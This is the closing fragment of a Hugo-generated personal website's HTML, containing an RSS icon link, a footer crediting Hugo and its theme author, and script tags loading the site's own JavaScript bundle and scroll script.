                <span></span><span><a href=https://pruthvirajbhat.github.io/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span></div>
        </div>
        <div class=footer__inner>
            <div class=footer__content><span>Powered by <a href=http://gohugo.io>Hugo</a></span>
                <span>Theme made by <a href=https://github.com/rhazdon>rhazdon</a></span></div>
        </div>
    </footer>
    </div>
    <script type=text/javascript src=https://pruthvirajbhat.github.io/bundle.min.59ecdc8ddd50b30e6dd7ad4a5372c3fd24a26db671cc1575443b150ceb9d4bc8e73618fb298596b5c336cf5d8c2db90bd7e72a648479e97884e5398722f962fa.js integrity="sha512-Wezcjd1Qsw5t161KU3LD/SSibbZxzBV1RDsVDOudS8jnNhj7KYWWtcM2z12MLbkL1+cqZIR56XiE5TmHIvli+g=="></script>
    <script src=https://pruthvirajbhat.github.io/js/scroll.js></script>
</body>

</html>